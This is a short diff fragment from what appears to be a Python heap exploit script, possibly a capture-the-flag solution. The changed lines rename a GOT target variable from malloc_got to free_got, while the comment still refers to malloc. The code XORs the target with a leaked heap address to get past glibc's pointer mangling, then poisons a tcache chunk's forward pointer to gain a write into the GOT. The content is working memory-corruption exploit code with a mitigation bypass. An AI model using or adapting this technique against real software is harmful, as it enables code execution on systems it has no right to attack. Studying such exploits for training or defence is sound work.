@@ -58,9 +58,9 @@ def tcache_overflow(p):
     heap_leak = decrypt_tcache(heap_leak)
 
     # Now we have our leak, we can use it to encrypt our target
-    malloc_got = 0x603010  # 8 bytes before malloc got, so we clobber pthread_exit :(
+    free_got = 0x603010  # 8 bytes before malloc got, so we clobber pthread_exit :(
     # We chose the target above as the final nibble is 0 (another mitigation bypass)
-    encrypted_tgt = malloc_got ^ (heap_leak >> 12)  # Step 2 to mitigation bypass
+    encrypted_tgt = free_got ^ (heap_leak >> 12)  # Step 2 to mitigation bypass
 
     # Overwrite the fd ptr of first chunk in 0x20 tcache
     edit(p, b'0', p64(0)*3 + p64(0x21) + p64(encrypted_tgt))
